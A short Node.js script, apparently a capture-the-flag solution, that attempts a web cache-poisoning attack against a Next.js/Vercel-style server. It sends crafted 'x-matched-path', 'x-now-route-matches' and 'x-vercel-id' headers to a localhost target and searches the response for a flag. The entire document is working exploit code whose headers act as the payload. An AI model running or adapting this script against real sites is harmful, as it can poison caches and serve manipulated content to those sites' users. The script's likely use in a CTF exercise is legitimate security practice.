const http = require('http');

async function exploitCachePoisoning(targetUrl) {
  const poisonedPath = '/'; // Assuming the vulnerable route is the home page
  const headers = {
    'x-matched-path': poisonedPath,
    'x-now-route-matches': '1=1',
    'x-vercel-id': 'cit1::iad1::randomid'
  };

  const options = {
    hostname: targetUrl.replace('http://', ''),
    path: poisonedPath,
    headers
  };

  try {
    const req = http.request(options, (res) => {
      console.log('Response status:', res.statusCode);
      console.log('Cache-Control header:', res.headers['cache-control']);

      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });

      res.on('end', () => {
        console.log('Response body:', body);

        if (body.includes('flag')) {
          console.log('Flag found in the response!');
        } else {
          console.log('Flag not found. You may need to adjust the exploit or try again.');
        }
      });
    });

    req.on('error', (error) => {
      console.error('Error during exploitation:', error);
    });

    req.end();
  } catch (error) {
    console.error('Error during exploitation:', error);
  }
}

// Replace with the actual target URL
const targetUrl = 'http://localhost:8081';

exploitCachePoisoning(targetUrl);